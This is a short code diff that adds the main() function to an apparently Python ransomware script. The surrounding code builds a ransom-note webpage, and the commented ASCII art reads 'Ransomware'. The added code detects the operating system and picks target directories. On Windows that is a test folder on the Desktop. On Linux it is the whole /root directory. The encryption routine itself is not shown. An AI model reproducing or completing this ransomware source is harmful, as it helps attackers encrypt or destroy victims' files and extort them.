@@ -91,3 +91,23 @@ def create_ransom_note_webpage(directory: str):
     </html>
     """
 
+def main():
+    # ascii_art = """
+    # _____                                                                              
+    #|  __ \                                                                             
+    #| |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
+    #|  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
+    #| | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
+    #|_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
+    #"""
+    # print(ascii_art)
+    # detect os
+    os_type = platform.system()
+    if os_type == "Windows":
+        target = r"C:\\Users\\%USERNAME%\\Desktop\\Ransomware_Test"
+    elif os_type == "Linux":
+        target = "/root"
+    else: 
+        print("Unsupported OS")
+        return
+                                                                                    
